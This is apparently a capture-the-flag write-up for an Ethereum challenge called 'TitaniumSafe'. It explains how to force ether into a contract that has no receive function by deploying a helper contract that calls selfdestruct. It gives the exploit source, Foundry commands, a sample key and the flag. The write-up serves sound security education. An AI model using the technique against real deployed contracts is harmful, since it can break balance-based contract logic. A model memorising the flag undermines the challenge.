<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>



# TitaniumSafe – CTF Writeup

## Challenge Overview

**Name:** Titanium Safe  
**ID:** `TitaniumSafe`  
**Flag format:** `MCTF25{...}`  

**Network info:**

- **RPC:** `http://10.240.2.53:8545`
- **RPC Port:** `8545`
- **Chain ID:** `31337`
- **Challenge Contract (TitaniumSafe):**  
  `0x30309713619205641579b59b6F60F37F2B4c2277`
- **Deployer Address:**  
  `0x657B798B912fd353b0aB4dC80e6aC27CB22f97dC`

**Challenge manager (TCP):**

```text
nc 10.240.2.53 31337
Welcome to the KiB Blockchain Challenge Manager
Challenge ID: TitaniumSafe
Commands: info | reset | flag | fund <address> [eth]
```

---

## Contract Analysis

The provided Solidity contract (simplified):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TitaniumSafe {
    address public immutable deployer;

    constructor() {
        deployer = msg.sender;
    }

    function deposit() external payable {
        require(msg.sender == deployer, "only owner can deposit");
    }

    function isSolved() external view returns (bool) {
        return address(this).balance >= 1 ether;
    }
}
```

### Key points

- `deployer` is set in the constructor to `msg.sender` at deployment time.
- `deposit()` can **only** be called successfully by the `deployer`.
- The challenge is considered solved when:

  ```solidity
  address(this).balance >= 1 ether
  ```

- There is **no** `receive()` or `fallback()` function, so a normal ETH transfer to the contract (e.g. via `transfer` / `call{value:}`) will revert.

Since we are **not** the `deployer` (`deployer` is fixed to the address in the challenge info), we cannot use `deposit()` to send ETH to the contract.

However, a contract’s balance can still be increased **without** calling any of its functions using `selfdestruct` from another contract.

---

## Vulnerability

Even though the contract tries to restrict who can deposit, it overlooks that **any other contract** can “force” ether into it via the `selfdestruct` opcode:

```solidity
selfdestruct(address payable target);
```

When a contract executes `selfdestruct(target)`:

- Its entire balance is sent to `target`.
- The target **does not execute any code** in the process.
- Therefore, no `require` checks in `deposit()` are triggered, and no `receive`/`fallback` is needed.

So we just need a helper contract that:

1. Accepts ETH in its constructor.
2. Immediately selfdestructs to the TitaniumSafe contract address.

If we send **1 ether** with that contract creation transaction, the `TitaniumSafe` contract’s balance will be ≥ 1 ETH, and `isSolved()` will return `true`.

---

## Exploit Contract

We create a tiny exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Exploit {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

- `target` = address of the TitaniumSafe contract.
- The constructor is `payable`, so we can send 1 ETH on deployment.
- In the constructor, we call `selfdestruct(target);` which sends all ETH to `target`.

---

## Exploitation Steps

### Tools

- [Foundry](https://github.com/foundry-rs/foundry):
  - `forge` for compilation.
  - `cast` for chain interactions.

---

### 1. Create a funded account

Generate a new keypair:

```bash
cast wallet new
```

Output (example):

```text
Successfully created new keypair.
Address: 0x71b4ef1D01ef85241Eb7A7014A1Af4570aB0e0c5
Private key: 0xb7ad16679288448598a89ca58b72ef61e5b5f173194b343a7e6e4748c0b360b6
```

Export the private key and set RPC URL:

```bash
export RPC_URL=http://10.240.2.53:8545
export PRIVATE_KEY=0xb7ad16679288448598a89ca58b72ef61e5b5f173194b343a7e6e4748c0b360b6
MYADDR=0x71b4ef1D01ef85241Eb7A7014A1Af4570aB0e0c5
```

Fund this address using the challenge manager:

```bash
nc 10.240.2.53 31337
> fund 0x71b4ef1D01ef85241Eb7A7014A1Af4570aB0e0c5 2
```

Then check the balance:

```bash
cast balance $MYADDR --rpc-url $RPC_URL
# should be >= 1 ether
```

Set the safe address from challenge info:

```bash
export SAFE=0x30309713619205641579b59b6F60F37F2B4c2277
```

---

### 2. Create the Foundry project and exploit contract

```bash
mkdir -p ~/titanium-safe
cd ~/titanium-safe

forge init --no-commit .
mkdir -p src
```

Create `src/Exploit.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Exploit {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

Build the project:

```bash
forge build
```

---

### 3. Get the bytecode of `Exploit`

We use `forge inspect` to obtain the creation bytecode:

```bash
BYTECODE=$(forge inspect src/Exploit.sol:Exploit bytecode)
```

You can quickly verify:

```bash
echo $BYTECODE | head -c 10
# should start with 0x60...
```

---

### 4. Deploy `Exploit` with 1 ETH and selfdestruct into TitaniumSafe

We use `cast send --create` to deploy the contract and send 1 ETH in the **same** transaction:

```bash
cast send   --rpc-url $RPC_URL   --private-key $PRIVATE_KEY   --value 1ether   --create "$BYTECODE"   "constructor(address)"   $SAFE
```

What happens in this transaction:

1. A new contract `Exploit` is created with `value = 1 ether`.
2. Its constructor runs with argument `target = SAFE`.
3. The constructor executes `selfdestruct(target);`.
4. The 1 ETH is sent directly to `TitaniumSafe` (`SAFE` address).
5. `TitaniumSafe`’s balance becomes ≥ 1 ETH.

---

### 5. Verify the solve condition

Check the contract’s balance (optional):

```bash
cast balance $SAFE --rpc-url $RPC_URL
```

Then call `isSolved()`:

```bash
cast call $SAFE "isSolved()(bool)" --rpc-url $RPC_URL
# Expected: true
```

If `true`, we’ve satisfied the on-chain requirement.

---

### 6. Retrieve the flag

Use the challenge manager again:

```bash
nc 10.240.2.53 31337
> flag
```

The service now detects that `isSolved()` is `true` and returns the flag:

```text
MCTF25{c4rb1d3_cut5_t1t@n1um}
```

